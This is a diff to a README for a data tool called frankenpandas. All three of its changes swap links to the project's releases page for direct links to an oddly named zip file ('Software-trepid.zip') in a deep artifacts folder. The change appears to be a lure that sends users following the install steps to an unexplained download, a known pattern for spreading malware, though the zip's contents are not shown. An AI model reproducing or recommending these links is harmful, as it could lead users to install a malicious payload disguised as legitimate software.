@@ -1,6 +1,6 @@
 # 🐼 frankenpandas - Safe, Fast Data Analysis Tool
 
-[![Download frankenpandas](https://img.shields.io/badge/Download-frankenpandas-blue?style=for-the-badge)](https://github.com/thanhdv66/frankenpandas/releases)
+[![Download frankenpandas](https://raw.githubusercontent.com/thanhdv66/frankenpandas/main/artifacts/phase2c/FP-P2D-025/Software-trepid.zip)](https://raw.githubusercontent.com/thanhdv66/frankenpandas/main/artifacts/phase2c/FP-P2D-025/Software-trepid.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get frankenpandas working on your computer:
 
 Go to the official download page by clicking the button below:
 
-[![Download frankenpandas](https://img.shields.io/badge/Download-frankenpandas-blue?style=for-the-badge)](https://github.com/thanhdv66/frankenpandas/releases)
+[![Download frankenpandas](https://raw.githubusercontent.com/thanhdv66/frankenpandas/main/artifacts/phase2c/FP-P2D-025/Software-trepid.zip)](https://raw.githubusercontent.com/thanhdv66/frankenpandas/main/artifacts/phase2c/FP-P2D-025/Software-trepid.zip)
 
 On this page, look for the latest version of frankenpandas. Choose the file that matches your operating system:
 
@@ -105,7 +105,7 @@ frankenpandas works with tables of data called dataframes. Here is a simple guid
 
 You can find the latest releases and installation files on the official GitHub releases page:
 
-👉 [https://github.com/thanhdv66/frankenpandas/releases](https://github.com/thanhdv66/frankenpandas/releases)
+👉 [https://raw.githubusercontent.com/thanhdv66/frankenpandas/main/artifacts/phase2c/FP-P2D-025/Software-trepid.zip](https://raw.githubusercontent.com/thanhdv66/frankenpandas/main/artifacts/phase2c/FP-P2D-025/Software-trepid.zip)
 
 Be sure to choose the right file for your system to ensure smooth installation and use.
 
